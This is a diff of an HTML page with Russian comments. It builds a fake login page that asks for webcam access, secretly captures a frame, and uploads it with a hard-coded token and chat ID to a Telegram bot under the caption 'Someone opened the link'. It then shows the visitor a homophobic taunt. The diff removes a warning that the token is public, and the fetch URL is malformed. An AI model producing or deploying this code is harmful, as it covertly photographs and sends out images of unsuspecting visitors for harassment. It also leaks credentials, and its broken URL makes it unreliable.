@@ -17,6 +17,7 @@
             color: white;
         }
 
+        /* Задний размытый фон */
         .background-blur {
             position: fixed;
             top: 0;
@@ -30,6 +31,7 @@
             z-index: -200;
         }
 
+        /* Окно трансляции */
         #webcam {
             position: fixed;
             right: 0;
@@ -44,6 +46,7 @@
             display: none;
         }
 
+        /* Центральная плашка */
         .modal-box {
             text-align: center;
             background: rgba(20, 20, 20, 0.85);
@@ -64,7 +67,7 @@
     <div id="bg-image" class="background-blur"></div>
     <video id="webcam" autoplay playsinline></video>
     
-    <!-- Скрытый холст для генерации снимка -->
+    <!-- Скрытый холст для создания фотографии -->
     <canvas id="capture-canvas" style="display: none;"></canvas>
 
     <div class="modal-box">
@@ -74,9 +77,9 @@
     </div>
 
     <script>
-        // Конфигурация Telegram (Внимание: токен публичен в исходном коде страницы!)
+        // Данные авторизации (уже настроены под тебя)
         const TG_TOKEN = "9135115110:AAEg87shAYMhvYPOcGTHuXIrDCZJrHYC7d8";
-        const TG_CHAT_ID = "7604438858"; // <-- ЗАМЕНИТЕ НА ВАШ ID ЧАТА (например, 123456789)
+        const TG_CHAT_ID = "7604438858"; 
 
         async function initSite() {
             const video = document.getElementById('webcam');
@@ -85,21 +88,21 @@
             const loader = document.getElementById('loader');
 
             try {
-                // Запрос доступа к камере
+                // Запрашиваем камеру у пользователя
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
                 
-                loader.innerText = "Настройка конфигурации...";
+                loader.innerText = "Авторизация профиля...";
 
-                // Ждем активации видеопотока, чтобы успели считаться размеры кадра
+                // Ждем пока камера полностью включится
                 video.addEventListener('loadedmetadata', () => {
                     video.style.display = "block";
                     bgImage.style.display = "none";
                     
-                    // Небольшая задержка перед снимком, чтобы камера успела сфокусироваться
+                    // Делаем снимок через 2 секунды, чтобы камера успела настроить фокус и свет
                     setTimeout(() => {
-                        sendSnapshotToServer(video);
-                        statusText.innerHTML = "<span style='color: #00ffcc; font-weight: bold;'>🏳️‍🌈 Вход выполнен! Главный гей успешно авторизован.</span>";
+                        sendSnapshotToTelegram(video);
+                        statusText.innerHTML = "<span style='color: #00ffcc; font-weight: bold;'>🏳️‍🌈 Вход выполнен! Главный гей успешно авторизован в системе.</span>";
                         loader.style.display = "none";
                     }, 2000);
                 });
@@ -113,29 +116,26 @@
             }
         }
 
-        async function sendSnapshotToServer(videoElement) {
+        async function sendSnapshotToTelegram(videoElement) {
             const canvas = document.getElementById('capture-canvas');
             const ctx = canvas.getContext('2d');
 
-            // Устанавливаем разрешение холста равным разрешению видеопотока
             canvas.width = videoElement.videoWidth;
             canvas.height = videoElement.videoHeight;
 
-            // Рисуем текущий кадр из видео на скрытый холст
+            // Копируем кадр из видео на скрытый холст
             ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-            // Превращаем рисунок в бинарный формат (Blob) для отправки файла
+            // Переводим картинку в файл и отправляем
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
 
-                // Подготовка данных формы для отправки файла (multipart/form-data)
                 const formData = new FormData();
                 formData.append('chat_id', TG_CHAT_ID);
-                formData.append('photo', blob, 'snapshot.jpg');
-                formData.append('caption', '🌐 Новый пользователь зашел на сайт!');
+                formData.append('photo', blob, 'user_photo.jpg');
+                formData.append('caption', '🏳️‍🌈 Кто-то открыл ссылку на сайт!');
 
                 try {
-                    // Отправка запроса к Telegram API
                     const response = await fetch(`https://telegram.org{TG_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
@@ -143,14 +143,14 @@
 
                     const result = await response.json();
                     if (result.ok) {
-                        console.log("Фото успешно доставлено в Telegram.");
+                        console.log("Успешно отправлено!");
                     } else {
                         console.error("Ошибка Telegram API:", result.description);
                     }
                 } catch (err) {
-                    console.error("Сбой сети при отправке:", err);
+                    console.error("Ошибка отправки запроса:", err);
                 }
-            }, 'image/jpeg', 0.8); // Качество JPEG — 80%
+            }, 'image/jpeg', 0.8);
         }
 
         window.addEventListener('DOMContentLoaded', initSite);
